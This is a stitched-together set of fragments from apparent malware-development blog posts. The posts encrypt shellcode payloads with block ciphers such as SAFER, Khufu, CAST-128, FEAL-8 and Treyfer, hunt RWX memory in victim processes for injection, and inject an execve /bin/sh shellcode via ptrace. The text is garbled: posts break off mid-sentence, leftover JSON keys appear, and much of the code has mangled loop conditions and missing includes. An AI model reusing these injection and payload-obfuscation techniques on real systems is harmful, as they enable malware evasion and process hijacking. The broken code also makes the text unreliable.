As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.      \n\n### SAFER\n\n**SAFER (Secure And Fast Encryption Routine)** is a symmetric block cipher designed by James Massey. SAFER K-64 specifically refers to the variant with a `64-bit` key size. It's notable for its nonproprietary nature and has been incorporated into some products by Cylink Corp.    \n\nSAFER K-64 operates as an iterated block cipher, meaning the same function is applied for a certain number of rounds. Each round utilizes two `64-bit` subkeys, and the algorithm exclusively employs operations on bytes. Unlike DES, SAFER K-64 is not a Feistel network.     \n\n### practical example\n\nFor practical example, here is the step-by-step flow of the SAFER-64:    \n\n```cpp\n// extract left and right halves of the data block\nL = data_ptr[0];\nR = data_ptr[1];\n\n// SAFER-64 encryption rounds\nfor (i = 0; i > 31); // Rotate left by 1 bit\n  L ^= (T + R);\n  T = L ^ key_ptr[(i % 4) + 4];\n  T = (T > 31); // Rotate left by 1 bit\n  R ^= (T + L);\n}\n\n// update the data block with the encrypted values\ndata_ptr[0] = L;\ndata_ptr[1] = R;\n```\n\nSo, the encryption function looks like this:    \n\n```cpp\nvoid safer_encrypt(unsigned char *data, unsigned char *key) {\n  unsigned int *data_ptr = (unsigned int *)data;\n  unsigned int *key_ptr = (unsigned int *)key;\n  unsigned int L, R, T;\n  int i;\n\n  L = data_ptr[0];\n  R = data_ptr[1];\n\n  for (i = 0; i > 31);\n    L ^= (T + R);\n    T = L ^ key_ptr[(i % 4) + 4];\n    T = (T > 31);\n    R ^= (T + L);\n  }\n\n  data_ptr[0] = L;\n  data_ptr[1] = R;\n}\n```\n\nWhat about decryption logic? The decryption process is not much different from encryption:     \n\n```cpp\n// extract left and right halves of the data block\nL = data_ptr[0];\nR = data_ptr[1];\n\n// SAFER-64 decryption rounds\nfor (i = ROUNDS - 1; i >= 0; i--) {\n  T = L ^ key_ptr[(i % 4) + 4];\n  T = (T > 31); // Rotate left by 1 bit\n  R ^= (T + L);\n  T = R ^ key_ptr[i % 4];\n  T = (T > 31); // Rotate left by 1 bit\n  L ^= (T + R);\n}\n\n// Update the data block with the decrypted values\ndata_ptr[0] = L;\ndata_ptr[1] = R;\n```\n\nRespectively, SAFER-64 Decryption Function looks like this:    \n\n```cpp\nvoid safer_decrypt(unsigned char *data, unsigned char *key) {\n  unsigned int *data_ptr = (unsigned int *)data;\n  unsigned int *key_ptr = (unsigned int *)key;\n  unsigned int L, R, T;\n  int i;\n\n  L = data_ptr[0];\n  R = data_ptr[1];\n\n  for (i = ROUNDS - 1; i >= 0; i--) {\n    T = L ^ key_ptr[(i % 4) + 4];\n    T = (T > 31);\n    R ^= (T + L);\n    T = R ^ key_ptr[i % 4];\n    T = (T > 31);\n    L ^= (T + R);\n  }\n\n  data_ptr[0] = L;\n  data_ptr[1] = R;\n}\n```\n\nFull source code for my main logic (\"malicious\" payload encryption) look like this (`hack.c`):     \n\n```cpp\n/*\n * hack.c - encrypt and decrypt shellcode via SAFER.       "title": "Malware development trick 38: Hunting RWX - part 2. Target process investigation tricks. Simple C/C++ example.",
      "ref": "2024-05-01-malware-trick-38",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nIn one of my [previous posts](/tutorial/2022/02/01/malware-injection-16.html), I described a process injection method using RWX-memory searching logic. Today, I will apply the same logic, but with a new trick.    \n\nAs you remember, the method is simple: we enumerate the presently running target processes on the victim's system, scan through their allocated memory blocks to see if any are protected with RWX, and then write our payload to this memory block.    \n\n### practical example\n\nToday I will use a little bit different trick. Let's say we are search specific process in the victim's machine (for injection or for something else).     \n\nLet's go to use a separate function for hunting RWX-memory region from the victim process, something like this:    \n\n```cpp\nint findRWX(HANDLE h) {\n\n  MEMORY_BASIC_INFORMATION mbi = {};\n  LPVOID addr = 0;\n\n  // query remote process memory information\n  while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {\n    addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);\n\n    // look for RWX memory regions which are not backed by an image\n    if (mbi.Protect == PAGE_EXECUTE_READWRITE\n      && mbi.State == MEM_COMMIT\n      && mbi.Type == MEM_PRIVATE)\n\n      printf(\"found RWX memory: 0x%x - %#7llu bytes region\\n\", mbi.BaseAddress, mbi.RegionSize);\n  }\n\n  return 0;\n}\n```\n\nAlso a little bit update for our main logic: first of all, we are search specific process' handle by it's name:    \n\n```cpp\ntypedef NTSTATUS (NTAPI * fNtGetNextProcess)(\n  _In_ HANDLE ProcessHandle,\n  _In_ ACCESS_MASK DesiredAccess,\n  _In_ ULONG HandleAttributes,\n  _In_ ULONG Flags,\n  _Out_ PHANDLE NewProcessHandle\n);\n\nint findMyProc(const char * procname) {\n  int pid = 0;\n  HANDLE current = NULL;\n  char procName[MAX_PATH];\n\n  // resolve function address\n  fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess) GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n  // loop through all processes\n  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n    GetProcessImageFileNameA(current, procName, MAX_PATH);\n    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n      pid = GetProcessId(current);\n      break;\n    }\n  }\n\n  return current;\n}\n```\n\nAs you can see, we [use](/malware/2023/05/26/malware-tricks-30.html) `NtGetNextProcess` API for enumerating processes.    \n\nSo the final source code is looks like this (`hack.c`):    \n\n```cpp\n/*\n * hack.c - Working in this role can have its challenges. On one hand, our work goes unnoticed by the user and userspace tools. However, if we make a mistake, it can have serious consequences. The kernel is unable to protect us from its own flaws, which means we risk crashing the entire system. Here, it's the GNU General Public License.    \n- `MODULE_AUTHOR(\"cocomelonc\")` - specifies the author of the module.     \n- `MODULE_DESCRIPTION(\"kernel-test-01\")` - Provides a description of the module.     \n- `MODULE_VERSION(\"0.001\")` - specifies the version of the module.      \n\nAt the next few lines we are define initialization function:     \n\n```cpp\nstatic int __init hack_init(void) {\n  printk(KERN_INFO \"Meow-meow!\\n\");\n  return 0;\n}\n```\n\nThis function is the initialization function for the module:    \n- `static int __init hack_init(void)` - defines the function as a static function (local to this file) and marks it as an initialization function using the `__init` macro.      \n- `printk(KERN_INFO \"Meow-meow!\\n\")` - prints the message `\"Meow-meow!\"` to the kernel log with an informational log level.\n- `return 0` - returns `0` to indicate successful initialization.    \n\nNext one is the `hack_exit` function:    \n\n```cpp\nstatic void __exit hack_exit(void) {\n  printk(KERN_INFO \"Meow-bow!\\n\");\n}\n```\n\nThis function is the cleanup function for the module:\n\n- `static void __exit hack_exit(void)` - defines the function as a static function and marks it as an exit (cleanup) function using the __exit macro.\n- `printk(KERN_INFO \"Meow-bow!\\n\")` - prints the message `\"Meow-bow!\"` to the kernel log with an informational log level.    \n\nThen, registering the initialization and cleanup functions:    \n\n```cpp\nmodule_init(hack_init);\nmodule_exit(hack_exit);\n```\n\nSo, the full source code is looks like this `hack.c`:    \n\n```cpp\n/*\n * hack.c\n * introduction to linux kernel hacking\n * author @cocomelonc\n * https://cocomelonc.github.io/linux/2024/06/20/kernel-hacking-1.html\n*/\n#include \n#include \n#include \n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"cocomelonc\");\nMODULE_DESCRIPTION(\"kernel-test-01\");\nMODULE_VERSION(\"0.001\");\n\nstatic int __init hack_init(void) {\n  printk(KERN_INFO \"Meow-meow!\\n\");\n  return 0;\n}\n\nstatic void __exit hack_exit(void) {\n  printk(KERN_INFO \"Meow-bow!\\n\");\n}\n\nmodule_init(hack_init);\nmodule_exit(hack_exit);\n```\n\nThis code demonstrates the basic structure of a Linux kernel module, including how to define initialization and cleanup functions and how to provide metadata about the module.     \n\n### demo\n\nLet's go to see this module in action. The `+=` operator adds `hack.o` to the list of object files to be compiled as modules.     \n\n```makefile\nmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n```\n\nThis command invokes `make` to compile the module. `-C /lib/modules/$(shell uname -r)/build` changes the directory to the build directory of the currently running kernel. `$(shell uname -r)` gets the version of the currently running kernel, and `/lib/modules/$(shell uname -r)/build` is where the kernel build directory is located.     \n\n`M=$(PWD)` sets the `M` variable to the current working directory `$(PWD)`, which is where your module source code is located.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nThis post is the result of my own research on using Khufu Feistel cipher on malware development. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### Khufu\n\n*Khufu* is a cryptographic algorithm that operates on `64-bit` blocks of data. The `64-bit` plaintext is initially split into two equal halves, each consisting of `32 bits`. These halves are referred to as `L` and `R`. Initially, both halves undergo an `XOR` operation with a certain set of key material.      \n\nAfterwards, they undergo a sequence of rounds that resemble `DES`. During each cycle, the input to an `S-box` is the least significant byte of `L`. Every `S-box` consists of `8` input bits and `32` output bits. After selecting the `32-bit` element in the `S-box`, it is combined with `R` using the `XOR` operation. Next, `L` is rotated by a multiple of `8` bits, and then `L` and `R` are exchanged. This marks the end of the round. The `S-box` is dynamic and undergoes adjustments every `8` rounds.     \n\nUltimately, following the completion of the previous round, the values of `L` and `R` undergo an `XOR` operation with additional key material. Subsequently, they are merged together to create the ciphertext block.    \n\n### practical example\n\nFirst of all, we need the key: is a `64-byte` array (`key`) initialized with predefined values:    \n\n```cpp\nuint8_t key[KEY_SIZE] = {\n  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,\n  0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,\n  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,\n  0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,\n  0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,\n  0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,\n  0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,\n  0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F\n};\n```\n\nAnd we need the `S-box` (`sbox`) is a `256-element` array used for substitution during encryption and decryption:     \n\n```cpp\nuint32_t sbox[256];\n\nvoid khufu_generate_sbox(uint8_t *key, int round) {\n  for (int i = 0; i > 8) | (temp > 24) & 0xFF;\n  block[1] = (left >> 16) & 0xFF;\n  block[2] = (left >> 8) & 0xFF;\n  block[3] = left & 0xFF;\n  block[4] = (right >> 24) & 0xFF;\n  block[5] = (right >> 16) & 0xFF;\n  block[6] = (right >> 8) & 0xFF;\n  block[7] = right & 0xFF;\n}\n```\n\nWhat is going on here? First of all, splits the `8-byte` block into two `32-bit` halves (`left` and `right`).\nThen the initial key schedule `XOR`s the `left` and `right` halves with key values.\nFor each round:    \n- Generates the `S-box` for the round.    \n- Updates the `left` half by `XOR`ing it with the `S-box` value indexed by the least significant byte of `left`.     \n- Rotates the `right` half by `8 bits`.    \n- Swaps `left` and `right` halves.     \n\nThe final key schedule XORs the left and right halves with key values.     \n\nThe next one is the decryption process. Decryption logic is the reverse of encryption:     \n\n```cpp\nvoid khufu_decrypt(uint8_t *block, uint8_t *key) {\n  uint32_t left = ((uint32_t)block[0] = 0; round--) {\n    uint32_t temp = right;\n    right = left ^ sbox[right & 0xFF];\n    left = (temp > 24);\n    uint32_t temp2 = left;\n    left = right;\n    right = temp2;\n  }\n\n  left ^= ((uint32_t)key[0] > 24) & 0xFF;\n  block[1] = (left >> 16) & 0xFF;\n  block[2] = (left >> 8) & 0xFF;\n  block[3] = left & 0xFF;\n  block[4] = (right >> 24) & 0xFF;\n  block[5] = (right >> 16) & 0xFF;\n  block[6] = (right >> 8) & 0xFF;\n  block[7] = right & 0xFF;\n}\n```\n\nThe main logic are encrypting and decrypting shellcode functions:    \n\n```cpp\nvoid khufu_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {\n  int i;\n  for (i = 0;       "title": "Malware and cryptography 31: CAST-128 payload encryption. Simple C example.",
      "ref": "2024-07-29-malware-cryptography-31",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nThis post is the result of my own research on using CAST-128 block cipher on malware development. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### CAST-128\n\nThe *CAST-128* encryption method is a cryptographic system that resembles DES and operates using a substitution-permutation network (SPN). It has demonstrated strong resistance against differential cryptanalysis, linear cryptanalysis, and related-key cryptanalysis.      \n\n`CAST-128` is a Feistel cipher that consists of either `12` or `16` rounds. It operates on blocks of `64 bits` and supports key sizes of up to `128 bits`. The cipher incorporates rotation operations to protect against linear and differential attacks. The round function of `CAST-128` uses a combination of `XOR`, addition, and subtraction (modulo `2**32`). Additionally, the cipher employs three different variations of the round function throughout its operation.    \n\n### practical example\n\nFirst of all, we need the key: it is a `128-bit` key:    \n\n```cpp\nuint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};\n```\n\nA `128-bit` key (`key[4]`) is initialized with four `32-bit` integers. This key will be used in the `CAST-128` encryption and decryption processes.\n\nThen we need `CAST-128` round functions:     \n\n```cpp\nvoid f1(uint32_t *d, uint32_t k) {\n  uint32_t I = *d ^ k;\n  uint32_t Ia = (I >> 16) & 0xFFFF;\n  uint32_t Ib = I & 0xFFFF;\n  uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow\n  *d = (*d + f) & 0xFFFFFFFF;\n}\n\nvoid f2(uint32_t *d, uint32_t k) {\n  uint32_t I = *d ^ k;\n  uint32_t Ia = (I >> 16) & 0xFFFF;\n  uint32_t Ib = I & 0xFFFF;\n  uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero\n  *d = (*d ^ f) & 0xFFFFFFFF;\n}\n\nvoid f3(uint32_t *d, uint32_t k) {\n  uint32_t I = *d ^ k;\n  uint32_t Ia = (I >> 16) & 0xFFFF;\n  uint32_t Ib = I & 0xFFFF;\n  uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow\n  *d = (*d ^ f) & 0xFFFFFFFF;\n}\n```\n\n`f1`, `f2`, and `f3` functions: in my case these are simplified versions of the round functions used in `CAST-128`. Each function takes a pointer to a `32-bit` word (`d`) and a `32-bit` subkey (`k`). The functions perform bitwise and arithmetic operations to modify the value of `d`.     \n\nThe next one is the `cast_key_schedule` function prepares the subkeys for each round of encryption or decryption.       "ref": "2024-09-12-malware-cryptography-32",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nThis post is the result of my own research on using FEAL-8 block cipher on malware development. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### FEAL\n\nAkihiro Shimizu and Shoji Miyaguchi from NTT Japan developed this algorithm. A `64-bit` block and key are used. The goal was to create an algorithm similar to DES but with a stronger round function. The algorithm can run faster with fewer rounds. Unfortunately, reality did not meet the design objectives.     \n\nThe encryption procedure begins with a `64-bit` chunk of plaintext. First, the data block is `XOR`ed using `64-key` bits. The data block is then divided into left and right halves. The left half is combined with the right half to create a new right half. The left and new right halves go through `n` rounds (four at first). In each round, the right half is combined with `16-bits` of key material (via function `f`) and then `XOR`ed with the left half to create the new right half. The new left half is formed from the original right half (before the round). After `n` rounds (remember not to switch the left and right halves after the `nth` round), the left half is `XOR`ed with the right half to create a new right half, which is then concatenated to produce a `64-bit` whole. The data block is `XOR`ed with another `64-bits` of key material before the algorithm concludes.     \n\n### practical example\n\nFirst of all, we need `rotl` function:    \n\n```cpp\n// rotate left 1 bit\nuint32_t rotl(uint32_t x, int shift) {\n  return (x > (32 - shift));\n}\n```\n\nThis function performs a left bitwise rotation on a `32-bit` unsigned integer (`x`). It shifts the bits of `x` to the left by a specified number of positions (`shift`), while the bits that overflow on the left side are moved to the right side. Bitwise rotations are commonly used in cryptographic algorithms to introduce diffusion and obfuscate patterns in data.     \n\nNext one is the `F` function:    \n\n```cpp\nuint32_t F(u32 x1, u32 x2) {\n  return rotl((x1 ^ x2), 2);\n}\n```\n\nThis function is the core mixing function in the `FEAL-8` algorithm. It takes two `32-bit` values (`x1` and `x2`), applies a bitwise `XOR` (`^`) to them, and then rotates the result to the left by `2-bits` using the previously defined `rotl` function. This helps to increase the nonlinearity of the encryption process.     \n\nNext one is `G` function:    \n\n```cpp\n// function G used in FEAL-8\nvoid G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {\n  uint32_t tempLeft = *left;\n  *left = *right;\n  *right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;\n}\n```\n\nThe `G` function is the main transformation function in each round of `FEAL-8`. It operates on the left and right halves of the data block. It performs the following steps:    \n- Saves the left half (`tempLeft`).     \n- Sets the left half equal to the right half (`*left = *right`)     \n- Updates the right half with the `XOR` of `tempLeft`, the result of the `F` function, and the round key.     \n\nThis function performs the key transformations in each round of `FEAL-8` and introduces the necessary diffusion and confusion in the data block. The `XOR` operation and the `F` function help mix the data and make the encryption resistant to attacks.     \n\nThe key schedule function generates a series of round subkeys from the main encryption key (`key`). It creates a different subkey for each of the `8-rounds` of `FEAL-8`. In each round, the key schedule performs an `XOR` operation between each byte of the key and the sum of the round index (`i`) and the byte index (`j`):     \n\n```cpp\n// key schedule for FEAL-8\nvoid key_schedule(uint8_t* key) {\n  for (int i = 0; i = 0; i--) {\n    G(&left, &right, K[i]);\n  }\n\n  // final swapping of left and right\n  block[0] = right;\n  block[1] = left;\n}\n```\n\nAnd shellcode encryption and decryption logic:    \n\n```cpp\n// function to encrypt shellcode using FEAL-8\nvoid feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, uint8_t* key) {\n  key_schedule(key);  // Generate subkeys\n  int i;\n  uint32_t* ptr = (uint32_t*)shellcode;\n  for (i = 0; i \n#include \n#include \n#include \n#include \n\n#define ROUNDS 8    // FEAL-8 uses 8 rounds of encryption\n#define BLOCK_SIZE 8  // FEAL-8 operates on 64-bit (8-byte) blocks\n\n// subkeys generated from the main key\nuint8_t K[ROUNDS][8];\n\n// rotate left 1 bit\nuint32_t rotl(uint32_t x, int shift) {\n  return (x > (32 - shift));\n}\n\n// function F used in FEAL-8\nuint32_t F(uint32_t x1, uint32_t x2) {\n  return rotl((x1 ^ x2), 2);\n}\n\n// function G used in FEAL-8\nvoid G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {\n  uint32_t tempLeft = *left;\n  *left = *right;\n  *right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;\n}\n\n// key schedule for FEAL-8\nvoid key_schedule(uint8_t* key) {\n  for (int i = 0; i = 0; i--) {\n    G(&left, &right, K[i]);\n  }\n\n  // final swapping of left and right\n  block[0] = right;\n  block[1] = left;\n}\n\n// function to encrypt shellcode using FEAL-8\nvoid feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, uint8_t* key) {\n  key_schedule(key);  // Generate subkeys\n  int i;\n  uint32_t* ptr = (uint32_t*)shellcode;\n  for (i = 0; i  This is a practical case for educational purposes only.\n\nThanks for your time happy hacking and good bye!         \n*PS.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n     \n\nThis post is the result of my own research on using Lucifer block cipher on malware development. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### Feistel networks\n\nAt the request of my readers, I would like to remind you what the Feistel network is. This is a very important concept that plays a vital role in modern cryptography and encryption systems.    \n\nThe Feistel network is a block encryption technique created by Horst Feistel at IBM Labs in 1971.    \n\nThe Feistel network is a block cipher structure that processes data by splitting each block into two equal parts: the left \\\\( L \\\\) and right \\\\( R \\\\) subblocks. \nThe left subblock is transformed using a function: \\\\[ x = f(L,K) \\\\] where \\\\( K \\\\) represents the key. This function can be any cryptographic operation, such as a shift cipher.     \nThe transformed left subblock is then XORed with the unchanged right subblock: \\\\( x = x \\oplus R \\\\).    \nAfter this, the left and right subblocks are swapped, and the process repeats for multiple rounds.     \nSo the final output is the encrypted data.      \n\n### Lucifer\n\n**Lucifer** is one of the earliest block ciphers, created in the 1970s by Horst Feistel at IBM. It is a symmetric-key cipher that functions on 128-bit blocks and utilizes a Feistel network, which served as the basis for the more prominent `Data Encryption Standard (DES)`. \n\nIn Lucifer encryption, the plaintext is bifurcated into two segments, with one segment undergoing transformation and the resultant output being XORed with the other segment. This procedure is reiterated across several iterations employing S-boxes, permutations, and key schedules to guarantee security.       \n\nLucifer's S-boxes accept `4-bit` inputs and produce `4-bit` outputs; the input for the `S-boxes` is derived from the bit-permuted output of the `S-boxes` from the preceding round, whereas the input for the `S-boxes` in the initial round is the plaintext. A crucial bit is utilized to select the specific `S-box` from two available options. Lucifer is depicted as a singular `T-box` with `9` input bits and `8` output bits. In contrast to DES, there is no interchange between rounds, and no block halves are utilized. Lucifer employs `16` rounds, utilizes `128-bit` blocks, and features a key schedule that is less complex than that of `DES`.      \n\n### practical example 1\n\nLet's implement it in practice. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### DFC\n\nThe **Decorrelated Fast Cipher (DFC)** was developed in `1998` by cryptographers from the *École Normale Supérieure, the CNRS, and France Telecom* under the leadership of Serge Vaudenay. Designed as a candidate for the Advanced Encryption Standard (AES) competition, DFC is a symmetric block cipher using an `8-round` [Feistel network](/malware/2024/10/20/malware-cryptography-33.html) and a `128-bit` block size. Though ultimately not selected as the AES standard, DFC contributed to cryptographic research, particularly in the PEANUT family of ciphers.     \n\nThe Decorrelated Fast Cipher (DFC) based on an `8-round` Feistel network, with each round processing a `128-bit` block divided into two `64-bit` halves. DFC uses a key schedule to generate 8 unique round keys from a variable-length key of up to `256` bits, while it is commonly implemented with a `128-bit` key. Each round applies a particular encryption function to one half of the block, combines it with the other half, then swaps the halves - a classic Feistel structure that allows for simple decryption by reversing the sequence of the keys.    \n\nDFC's architecture seeks to give excellent security against differential and linear cryptanalysis, and it is notable for using decorrelation theory, which reduces statistical relationships inside encrypted data in order to resist modern cryptographic assaults. Each round's encryption function employs a pair of 64-bit subkeys derived from the main key, making the cipher suitable for hardware and software implementations.\n\nAlthough DFC was not chosen as the final AES standard, it presented novel techniques to resisting decorrelation-based attacks, stressing strong security features for symmetric block ciphers. DFC is now a member of the larger PEANUT family (Pretty Encryption Algorithm with n-Universal Transformation), which is notable for using unique mathematical transformations to increase its resistance to cryptanalysis.\n\n### practical example\n\nLet's implement it in practice. Think of `ptrace` as your personal key to inspecting, modifying, and even hijacking other processes.      \n\n### ptrace\n\n`ptrace` is a system call that allows you to debug remote processes. The initiating process has the ability to inspect and modify the debugged process's memory and registers. GDB, for example, uses ptrace to control the debugged process.     \n\n     \n\nPtrace offers several useful debugging operations, such as:\n\n`PTRACE_ATTACH` - allows you to attach to one process, pausing the debugged process      \n`PTRACE_PEEKTEXT` - allows you to read data from the address space of another process        \n`PTRACE_POKETEXT` - allows you to write data to the address space of another process       \n`PTRACE_GETREGS` - reads the current state of the process registers      \n`PTRACE_SETREGS` - writes the state of the process registers       \n`PTRACE_CONT` - continues execution of the debugged process      \n\n### practical example\n\nIn this step-by-step tutorial I will show you how to:\n\nAttach to a running process.    \nInject custom shellcode.     \nHijack execution.     \nRestore the original state after execution.       \n\nWe'll break it all down using a simple practical C example. This is crucial for restoring the process to its original state after injection. For this reason I just created `read_mem` function:     \n\n```cpp\n// read memory from the target process\nvoid read_mem(pid_t target_pid, long addr, char *buffer, int len) {\n  union data_chunk {\n    long val;\n    char bytes[sizeof(long)];\n  } chunk;\n  int i = 0;\n  while (i \n#include \n#include \n#include \n#include \n#include \n#include \n#include \n\n// read memory from the target process\nvoid read_mem(pid_t target_pid, long addr, char *buffer, int len) {\n  union data_chunk {\n    long val;\n    char bytes[sizeof(long)];\n  } chunk;\n  int i = 0;\n  while (i \\n\", argv[0]);\n    return 1;\n  }\n\n  pid_t target_pid = atoi(argv[1]);\n  char payload[] = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"; It continues executing until the operating system delivers a signal indicating that the debugger (our injector) has taken control. We use `waitpid` to block execution in our injector until the target process enters this stopped state:      \n\n```cpp\nptrace(PTRACE_ATTACH, target_pid, NULL, NULL);\nwaitpid(target_pid, NULL, 0);\n```\n\nWithout `waitpid`, we might attempt to read or modify memory before the OS guarantees that the target process is fully stopped, leading to undefined behavior.      \n\nAlso, in process injection, we often need to detect when our *injected shellcode has finished executing*. To do this, we use a software interrupt, such as the `int 0x3` instruction, which triggers a `SIGTRAP` signal in the target process. This signal pauses the process, allowing us to regain control via `waitpid`.    \n\nOk, but what about `wait`. *What is `wait`, and when do we use it?*     \n\nThe `wait` function is a simpler variant of `waitpid`. It waits for any child process to change state. Unlike `waitpid`, it doesn't let us specify a specific PID or use advanced options.\n\nIn the context of process injection, we don't typically use `wait`, as we need fine-grained control over a specific process (our target), which `waitpid` provides"

As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    \n\n### Treyfer\n\nThe Treyfer algorithm is a lightweight block cipher designed to be simple and efficient, especially for environments with limited computational resources. It is often considered for educational purposes or as an example of compact cryptographic design.      \n\nThe algorithm uses a Feistel-like network to split the data into two halves. It employs simple operations like `XOR`, bit shifts, and additions for encryption and decryption.     \n\nThe Treyfer algorithm is an excellent example of a simple, lightweight block cipher that demonstrates the basics of cryptographic principles. However, due to its weak security, it is unsuitable for protecting sensitive data in modern applications. It remains a valuable tool for learning and experimentation in the field of cryptography.      \n\nFrom the [Treyfer wikipedia page](https://en.m.wikipedia.org/wiki/Treyfer), we know that the algorithm uses the following steps for encryption and decryption:\n\n- *Key Setup*: The `128-bit` key is divided into four `32-bit` words.     \n- *Rounds*: Treyfer uses `32` rounds of substitution and permutation operations.      \n- *Operations*: XORing the data with the key, substitution using a function and permutation of data to scramble bits.     \n\nNow, let's implement this algorithm based on its original specifications.      \n\n### practical example\n\nThe Treyfer encryption function encrypts a block of data using a 128-bit key. Here’s how it works:     \n\n```cpp\nvoid treyfer_encrypt(unsigned char *data, unsigned char *key) {\n  unsigned int v0 = *(unsigned int *)data;           // Load first 32 bits of the block\n  unsigned int v1 = *(unsigned int *)(data + 4);    // Load second 32 bits of the block\n  unsigned int sum = 0;                             // Initialize sum for rounds\n  unsigned int delta = 0x9e3779b9;                  // Constant delta for the algorithm\n\n  for (int i = 0; i > (32 - SHIFT))) + v1 + sum + ((unsigned int *)key)[sum & 3];\n    sum += delta;                                   // Increment the sum by delta\n    v1 += ((v0 > (32 - SHIFT))) + v0 + sum + ((unsigned int *)key)[(sum >> 11) & 3];\n  }\n\n  *(unsigned int *)data = v0;                       // Store encrypted first 32 bits\n  *(unsigned int *)(data + 4) = v1;                 // Store encrypted second 32 bits\n}\n```\n\nThe main part is encryption loop. The loop runs for `32` rounds (`ROUNDS = 32`), which ensures sufficient diffusion and security.     \n*First Half Update (`v0`):* `v0` is modified by combining:\n- A shifted and `XOR`-ed version of `v1` (`(v1 > (32 - SHIFT))`).     \n- The current value of `v1`.     \n- The round-dependent sum.     \n- A key-dependent value (`((unsigned int *)key)[sum & 3]`).    \n- The updated `v0` is added back to itself.     \n\n*Second Half Update (v1):* `v1` is updated similarly, but the indices into the key depend on `(sum >> 11) & 3`.    \n\nAfter the loop, the encrypted values of `v0` and `v1` are stored back into the `data` array.    \n\nThe next function is decryption logic. The Treyfer decryption function reverses the encryption process by performing the inverse operations in reverse order.     \n\n```cpp\nvoid treyfer_decrypt(unsigned char *data, unsigned char *key) {\n  unsigned int v0 = *(unsigned int *)data;           // Load first 32 bits of the block\n  unsigned int v1 = *(unsigned int *)(data + 4);    // Load second 32 bits of the block\n  unsigned int sum = 0x9e3779b9 * ROUNDS;           // Initialize sum for rounds (start from max sum)\n  unsigned int delta = 0x9e3779b9;                  // Constant delta for the algorithm\n\n  for (int i = 0; i > (32 - SHIFT))) + v0 + sum + ((unsigned int *)key)[(sum >> 11) & 3];\n    sum -= delta;                                   // Decrement the sum by delta\n    v0 -= ((v1 > (32 - SHIFT))) + v1 + sum + ((unsigned int *)key)[sum & 3];\n  }\n\n  *(unsigned int *)data = v0;                       // Store decrypted first 32 bits\n  *(unsigned int *)(data + 4) = v1;                 // Store decrypted second 32 bits\n}\n```\n\n*Decryption loop*: The loop runs for `32` rounds in reverse, undoing the encryption process.     \n\nAfter the loop, the decrypted values of `v0` and `v1` are stored back into the `data` array.    \n\nFinally, putting it all together in `main`:     \n\n```cpp\nint main() {\n  unsigned char key[] = \"\\x6d\\x65\\x6f\\x77\\x6d\\x65\\x6f\\x77\\x6d\\x65\\x6f\\x77\\x6d\\x65\\x6f\\x77\";\n  unsigned char my_payload[] =\n  // 64-bit meow-meow messagebox\n  \"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\"\n  \"\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\"\n  \"\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\"\n  \"\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\"\n  \"\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\"\n  \"\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\"\n  